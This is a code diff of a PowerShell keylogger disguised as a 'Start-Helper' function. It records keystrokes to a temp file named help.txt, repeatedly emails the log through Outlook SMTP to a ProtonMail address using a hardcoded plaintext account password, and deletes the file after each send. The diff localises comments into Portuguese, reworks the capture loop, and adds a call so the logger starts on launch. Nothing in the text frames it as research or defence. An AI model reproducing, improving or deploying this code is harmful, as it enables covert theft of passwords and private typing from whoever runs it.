@@ -1,13 +1,13 @@
 $TimesToRun = 6000
-$RunTimeP = 0.1    # Time in minutes
+$RunTimeP = 0.1    # Tempo em minutos
 $From = "luccasmachado001@outlook.com"
 $Pass = "hbzgnuqauqooxcbq"
 $To = "carlosalberto58@protonmail.com"
 $Subject = "pragmatica"
 $body = "report"
-$SMTPServer = "smtp-mail.outlook.com"    # Outlook SMTP
+$SMTPServer = "smtp-mail.outlook.com"    # Servidor SMTP do Outlook
 $SMTPPort = "587"
-$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
+$credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
 function Start-Helper($Path="$env:temp\help.txt") {
     $signatures = @'
@@ -26,11 +26,11 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $null = New-Item -Path $Path -ItemType File -Force
 
     try {
-        $Runner = 0
         while ($true) {
-            $TimeStart = Get-Date
-            $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
+            $Runner = 0
             while ($TimesToRun -ge $Runner) {
+                $TimeStart = Get-Date
+                $TimeEnd = $TimeStart.AddMinutes($RunTimeP)
                 while ($TimeEnd -ge (Get-Date)) {
                     Start-Sleep -Milliseconds 40
                     for ($ascii = 9; $ascii -le 254; $ascii++) {
@@ -48,12 +48,15 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
                         }
                     }
                 }
-                send-mailmessage -from $From -to $To -subject $Subject -body $body -Attachment $Path -smtpServer $SMTPServer -port $SMTPPort -credential $credentials -usessl
-                Remove-Item -Path $Path -force
+                send-mailmessage -From $From -To $To -Subject $Subject -Body $body -Attachment $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+                Remove-Item -Path $Path -Force
                 $Runner++
-                break  # Exit the inner while loop to restart the process
             }
         }
     }
     finally {
         exit 1
+    }
+}
+
+Start-Helper
